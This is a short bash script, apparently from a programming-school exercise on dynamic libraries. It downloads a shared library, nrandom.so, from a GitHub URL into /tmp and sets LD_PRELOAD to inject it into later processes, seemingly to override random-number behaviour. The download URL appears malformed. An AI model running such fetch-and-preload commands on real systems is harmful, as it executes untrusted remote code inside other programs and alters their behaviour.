#!/bin/bash
wget -P /tmp https://github.com/fayoxis/alx-low_level_programming/new/master/0x18-dynamic_libraries/nrandom.so
export LD_PRELOAD=/tmp/nrandom.so
